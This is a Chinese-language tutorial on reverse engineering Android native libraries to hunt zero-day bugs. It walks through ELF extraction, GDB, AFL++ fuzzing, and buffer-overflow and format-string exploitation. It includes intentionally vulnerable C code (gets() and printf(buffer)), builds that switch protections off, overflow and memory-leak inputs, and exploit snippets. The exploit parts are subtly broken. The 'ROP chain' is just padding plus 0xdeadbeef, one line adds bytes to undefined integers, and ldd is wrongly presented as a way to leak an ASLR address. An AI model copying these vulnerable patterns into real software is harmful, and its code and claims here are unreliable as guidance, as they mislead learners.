# **📜 Day 70: 逆向挖掘 0Day 漏洞**

## **📌 学习目标**
✅ **掌握 0Day 漏洞（Zero-Day Exploit）的基本概念，理解漏洞的危害**。  
✅ **学习如何使用 `IDA Pro`、`Ghidra`、`GDB`、`Frida` 进行二进制分析**。  
✅ **掌握常见的二进制漏洞类型，如缓冲区溢出、格式化字符串、整数溢出、Use-After-Free 等**。  
✅ **学习如何 Fuzz 测试应用，挖掘潜在漏洞**。  
✅ **实战：逆向分析应用，寻找 0Day 漏洞，成功构造 Exploit！**  

---

# **1️⃣ 什么是 0Day 漏洞？**
0Day 漏洞（Zero-Day Exploit）是指开发者 **未知** 且尚未修复的漏洞，黑客可利用该漏洞 **执行任意代码、提升权限或获取敏感信息**。  
📌 **常见的 0Day 漏洞类型**
| **漏洞类型** | **描述** | **常见影响** |
|------------|--------|------------|
| **缓冲区溢出（Buffer Overflow）** | 超出数组范围写入数据 | 代码执行、提权 |
| **格式化字符串漏洞（Format String Bug）** | 不安全的 `printf()` | 读取/修改内存 |
| **整数溢出（Integer Overflow）** | 计算错误导致溢出 | 逃逸沙盒 |
| **Use-After-Free（UAF）** | 释放后访问对象 | 远程代码执行 |

---

# **2️⃣ 逆向分析目标应用**
## **✅ 1. 提取 ELF 二进制**
📌 **查找可执行文件**
```bash
adb shell ls /data/app/com.example.app/lib/arm64/
```
📌 **提取 so**
```bash
adb pull /data/app/com.example.app/lib/arm64/libtarget.so .
```

## **✅ 2. 使用 `readelf` 分析 ELF 结构**
📌 **查看 ELF 头**
```bash
readelf -h libtarget.so
```
📌 **查看动态符号**
```bash
readelf -s libtarget.so
```
📌 **查找可疑函数**
```bash
strings libtarget.so | grep system
```

---

# **3️⃣ 缓冲区溢出漏洞分析**
## **✅ 1. 漏洞代码示例**
📌 **存在 `gets()` 缓冲区溢出**
```c
#include <stdio.h>
void vulnerable() {
    char buffer[32];
    printf("Enter input: ");
    gets(buffer);
}
```
📌 **编译 ELF**
```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack
```
📌 **分析 ELF**
```bash
objdump -d vuln | grep call
```

## **✅ 2. 使用 `GDB` 调试**
📌 **加载 ELF**
```bash
gdb ./vuln
break *vulnerable
run
```
📌 **输入超长数据**
```bash
python -c 'print("A" * 100)' | ./vuln
```
📌 **查看寄存器**
```bash
info registers
```

---

# **4️⃣ 格式化字符串漏洞分析**
## **✅ 1. 漏洞代码示例**
📌 **存在 `printf()` 格式化字符串漏洞**
```c
#include <stdio.h>
void vulnerable() {
    char buffer[64];
    printf("Enter input: ");
    gets(buffer);
    printf(buffer);
}
```
📌 **输入 `%x %x %x` 可能泄露内存**
```bash
python -c 'print("%x %x %x")' | ./vuln
```

---

# **5️⃣ Fuzz 测试**
## **✅ 1. 使用 `AFL++` 进行 Fuzz**
📌 **安装 AFL**
```bash
sudo apt install afl++
```
📌 **编译目标**
```bash
afl-gcc -o vuln_fuzz vuln.c
```
📌 **运行 Fuzz**
```bash
afl-fuzz -i inputs/ -o output/ -- ./vuln_fuzz
```

---

# **6️⃣ 漏洞利用**
## **✅ 1. 利用缓冲区溢出执行 Shell**
📌 **构造 ROP 链**
```python
payload = b"A" * 40
payload += b"\xef\xbe\xad\xde"
print(payload)
```
📌 **运行 Exploit**
```bash
python exploit.py | ./vuln
```

## **✅ 2. 绕过 ASLR**
📌 **泄露 libc 地址**
```bash
ldd ./vuln
```
📌 **利用 ROP 绕过保护**
```python
payload = b"A" * 40
payload += libc_base + system_offset
```

---

# **🛠 实战任务**
### **✅ 1. 提取 ELF**
```bash
adb pull /data/app/com.example.app/lib/arm64/libtarget.so .
```
### **✅ 2. 使用 `readelf` 分析**
```bash
readelf -h libtarget.so
readelf -s libtarget.so
```
### **✅ 3. 进行 Fuzz 测试**
```bash
afl-fuzz -i inputs/ -o output/ -- ./vuln
```
### **✅ 4. 缓冲区溢出利用**
```python
python -c 'print("A" * 100)' | ./vuln
```
### **✅ 5. 绕过 ASLR**
```python
payload = b"A" * 40
payload += libc_base + system_offset
```

---

# **📚 参考资料**
📌 **二进制漏洞**
- `IDA Pro`：[https://hex-rays.com/](https://hex-rays.com/)  
- `Ghidra`：[https://ghidra-sre.org/](https://ghidra-sre.org/)  
- `GDB`：[https://www.gnu.org/software/gdb/](https://www.gnu.org/software/gdb/)  

📌 **Fuzz 测试**
- `AFL++`：[https://github.com/AFLplusplus/AFLplusplus](https://github.com/AFLplusplus/AFLplusplus)  

📌 **漏洞利用**
- `ROP Gadget`：[https://github.com/JonathanSalwan/ROPgadget](https://github.com/JonathanSalwan/ROPgadget)  

---

🔥 **任务完成后，你将掌握：**  
✅ **如何提取 ELF 二进制，分析关键函数**  
✅ **如何 Fuzz 测试应用，挖掘潜在漏洞**  
✅ **如何利用缓冲区溢出 & 格式化字符串漏洞进行 Exploit**  
✅ **如何绕过 ASLR 保护，执行任意代码**  

🚀 **下一步（Day 100）**：**终极挑战：逆向一个完整 APP！** 🎯